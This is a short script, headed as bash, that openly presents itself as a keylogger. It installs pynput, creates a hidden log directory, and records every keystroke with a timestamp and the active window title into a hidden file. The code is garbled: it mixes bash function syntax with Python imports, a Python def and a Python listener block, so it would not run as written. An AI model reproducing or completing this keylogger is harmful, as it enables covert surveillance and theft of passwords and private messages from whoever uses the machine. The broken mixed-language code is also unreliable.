#!/bin/bash

# Install necessary libraries
apt-get update
apt-get install -y pynput

# Create a hidden directory for logging data
mkdir -p ~/.keylogger_logs

# Function to log keystrokes with timestamps and window title
function log_key {
    KEY=$1
    TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
    ACTIVE_WINDOW=$(xprop -root | grep "WM_CLASS(STRING)")
    
    # Append the keypress, timestamp, and active window to the hidden log file
    echo "$TIMESTAMP $ACTIVE_WINDOW: $KEY" >> ~/.keylogger_logs/keylog.txt
}

# Hook keyboard events using pynput library
from pynput import keyboard

def on_press(key):
    try:
        log_key(key.char)
    except AttributeError:
        log_key(str(key))

# Start listening for keyboard input and call the function when a key is pressed
with keyboard.Listener(on_press=on_press) as listener:
    while true:
        sleep(10)  # Check every 10 seconds

